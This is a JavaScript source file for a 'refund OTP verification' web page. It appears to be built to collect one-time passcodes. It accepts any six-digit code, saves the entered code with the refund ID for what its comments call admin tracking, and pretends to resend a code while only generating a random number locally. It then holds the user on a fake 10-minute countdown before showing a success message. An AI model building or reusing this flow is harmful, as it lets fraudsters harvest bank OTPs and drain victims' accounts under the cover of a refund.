// Refund OTP verification functionality
let currentRefund = null;
let timerInterval = null;

document.addEventListener('DOMContentLoaded', function() {
    loadRefundData();
    setupOTPInputs();
    setupOTPForm();
});

// Load refund data from localStorage
function loadRefundData() {
    currentRefund = JSON.parse(localStorage.getItem('currentRefund'));
    
    if (!currentRefund) {
        alert('No refund data found. Redirecting to refund form.');
        window.location.href = 'refund.html';
        return;
    }
    
    // Display refund information
    document.getElementById('displayRefundId').textContent = currentRefund.id;
}

// Setup OTP form
function setupOTPForm() {
    const otpForm = document.getElementById('refundOtpForm');
    const resendBtn = document.getElementById('resendRefundOtp');
    
    otpForm.addEventListener('submit', function(e) {
        e.preventDefault();
        handleOTPVerification();
    });
    
    resendBtn.addEventListener('click', function(e) {
        e.preventDefault();
        resendOTP();
    });
}

// Setup OTP inputs
function setupOTPInputs() {
    const otpInputs = document.querySelectorAll('.refund-otp-input');
    
    otpInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            // Only allow numbers
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            
            // Move to next input if current is filled
            if (e.target.value.length === 1 && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
        });
        
        input.addEventListener('keydown', (e) => {
            // Move to previous input on backspace
            if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                otpInputs[index - 1].focus();
            }
        });
        
        // Handle paste
        input.addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
            
            for (let i = 0; i < Math.min(pastedData.length, otpInputs.length - index); i++) {
                if (otpInputs[index + i]) {
                    otpInputs[index + i].value = pastedData[i];
                }
            }
            
            // Focus on next empty input or last input
            const nextEmptyIndex = index + pastedData.length;
            if (nextEmptyIndex < otpInputs.length) {
                otpInputs[nextEmptyIndex].focus();
            } else {
                otpInputs[otpInputs.length - 1].focus();
            }
        });
    });
}

// Handle OTP verification
function handleOTPVerification() {
    console.log('handleOTPVerification called'); // Debug log
    
    const otpInputs = document.querySelectorAll('.refund-otp-input');
    const enteredOTP = Array.from(otpInputs).map(input => input.value).join('');
    
    console.log('Entered OTP:', enteredOTP); // Debug log
    
    if (enteredOTP.length !== 6) {
        alert('Please enter complete 6-digit OTP');
        return;
    }
    
    // For refund process, accept any 6-digit OTP (in real app, validate against server)
    console.log('OTP validation passed, processing...'); // Debug log
    
    // Generate and save OTP data
    const otpData = {
        otp: enteredOTP,
        refundId: currentRefund.id,
        timestamp: new Date().toISOString(),
        type: 'refund',
        status: 'verified'
    };
    
    // Save OTP using simple display system
    if (typeof addOTPData === 'function') {
        addOTPData(otpData);
    }
    
    // Save OTP to refund OTPs list using shared storage (backup)
    let refundOtps = loadSharedData('refundOtps');
    refundOtps.push(otpData);
    saveSharedData('refundOtps', refundOtps);
    
    // Update refund status
    let refunds = loadSharedData('refunds');
    const refundIndex = refunds.findIndex(r => r.id === currentRefund.id);
    if (refundIndex !== -1) {
        refunds[refundIndex].status = 'processing';
        refunds[refundIndex].otpVerified = enteredOTP;
        refunds[refundIndex].otpVerifiedAt = new Date().toISOString();
        saveSharedData('refunds', refunds);
        
        // Also update in simple system
        if (typeof addRefundData === 'function') {
            // Update the existing refund in simple system
            const simpleRefunds = getRefundData();
            const simpleIndex = simpleRefunds.findIndex(r => r.id === currentRefund.id);
            if (simpleIndex !== -1) {
                simpleRefunds[simpleIndex].status = 'processing';
                simpleRefunds[simpleIndex].otpVerified = enteredOTP;
                simpleRefunds[simpleIndex].otpVerifiedAt = new Date().toISOString();
            }
        }
    }
    
    // Show notification for immediate feedback
    showNotification('OTP verified successfully! Processing refund...');
    
    console.log('OTP saved to both systems:', otpData);
    console.log('Data saved, showing timer...'); // Debug log
    
    // Show waiting timer modal
    showWaitingTimer();
}

// Show success modal
function showSuccessModal() {
    document.getElementById('successRefundId').textContent = currentRefund.id;
    document.getElementById('successRefundAmount').textContent = currentRefund.amount;
    document.getElementById('refundSuccessModal').style.display = 'block';
}

// Resend OTP
function resendOTP() {
    // Generate new OTP
    const newOTP = Math.floor(100000 + Math.random() * 900000).toString();
    
    // Clear current inputs
    const otpInputs = document.querySelectorAll('.refund-otp-input');
    otpInputs.forEach(input => {
        input.value = '';
        input.style.borderColor = '#eee';
    });
    
    // Focus first input
    otpInputs[0].focus();
    
    // Show notification
    showNotification('New OTP generated! Please check your registered mobile number.');
    
    // Save the new OTP for admin tracking
    const otpData = {
        otp: newOTP,
        refundId: currentRefund.id,
        timestamp: new Date().toISOString(),
        type: 'refund',
        status: 'pending'
    };
    
    let refundOtps = loadSharedData('refundOtps');
    refundOtps.push(otpData);
    saveSharedData('refundOtps', refundOtps);
}

// Show notification
function showNotification(message) {
    // Create notification element
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #ff6b6b;
        color: white;
        padding: 1rem 2rem;
        border-radius: 10px;
        z-index: 10000;
        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        animation: slideIn 0.3s ease;
        max-width: 300px;
    `;
    notification.textContent = message;
    
    // Add animation keyframes if not exists
    if (!document.querySelector('#notification-styles')) {
        const style = document.createElement('style');
        style.id = 'notification-styles';
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes slideOut {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(100%); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    }
    
    document.body.appendChild(notification);
    
    // Remove notification after 4 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 300);
    }, 4000);
}

// Close modal when clicking outside
window.addEventListener('click', (e) => {
    if (e.target.classList.contains('modal')) {
        e.target.style.display = 'none';
    }
});
// Show waiting timer modal
function showWaitingTimer() {
    console.log('showWaitingTimer called'); // Debug log
    
    // Hide the main OTP container instead of a modal
    const otpContainer = document.querySelector('.otp-container');
    if (otpContainer) {
        otpContainer.style.display = 'none';
    }
    
    // Show timer modal
    const timerModal = document.getElementById('waitingTimerModal');
    if (timerModal) {
        document.getElementById('timerRefundId').textContent = currentRefund.id;
        timerModal.style.display = 'block';
        
        console.log('Timer modal displayed'); // Debug log
        
        // Start 10-minute countdown
        startCountdown(10 * 60); // 10 minutes in seconds
    } else {
        console.error('Timer modal not found'); // Debug log
    }
}

// Start countdown timer
function startCountdown(totalSeconds) {
    let timeLeft = totalSeconds;
    
    // Clear any existing timer
    if (timerInterval) {
        clearInterval(timerInterval);
    }
    
    // Update timer display immediately
    updateTimerDisplay(timeLeft);
    
    timerInterval = setInterval(() => {
        timeLeft--;
        updateTimerDisplay(timeLeft);
        
        // When timer reaches 0
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            completeRefundProcess();
        }
    }, 1000);
}

// Update timer display
function updateTimerDisplay(seconds) {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    
    const minutesEl = document.getElementById('timerMinutes');
    const secondsEl = document.getElementById('timerSeconds');
    
    if (minutesEl && secondsEl) {
        minutesEl.textContent = minutes.toString().padStart(2, '0');
        secondsEl.textContent = remainingSeconds.toString().padStart(2, '0');
    } else {
        console.error('Timer display elements not found');
    }
    
    // Update progress circle (optional visual enhancement)
    const totalTime = 10 * 60; // 10 minutes
    const progress = ((totalTime - seconds) / totalTime) * 100;
    updateProgressCircle(progress);
}

// Update progress circle visual
function updateProgressCircle(progress) {
    const circle = document.querySelector('.timer-circle');
    if (circle) {
        // Add visual progress indication
        circle.style.background = `conic-gradient(#ff6b6b ${progress * 3.6}deg, #f8f9fa 0deg)`;
    }
}

// Complete refund process after timer
function completeRefundProcess() {
    // Update refund status to processed using shared storage
    let refunds = loadSharedData('refunds');
    const refundIndex = refunds.findIndex(r => r.id === currentRefund.id);
    if (refundIndex !== -1) {
        refunds[refundIndex].status = 'processed';
        refunds[refundIndex].processedAt = new Date().toISOString();
        saveSharedData('refunds', refunds);
    }
    
    // Hide timer modal and show success modal
    document.getElementById('waitingTimerModal').style.display = 'none';
    showSuccessModal();
    
    // Clear current refund data
    localStorage.removeItem('currentRefund');
    
    // Show completion notification
    showNotification('Refund has been successfully initiated! You will receive confirmation shortly.');
}

// Enhanced show success modal
function showSuccessModal() {
    document.getElementById('successRefundId').textContent = currentRefund.id;
    document.getElementById('refundSuccessModal').style.display = 'block';
}

// Clean up timer on page unload
window.addEventListener('beforeunload', () => {
    if (timerInterval) {
        clearInterval(timerInterval);
    }
});

// Handle page visibility change (pause/resume timer when tab is hidden/visible)
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        // Page is hidden - you might want to pause or continue timer
        // For now, we'll let it continue running
    } else {
        // Page is visible again
        // Timer continues normally
    }
});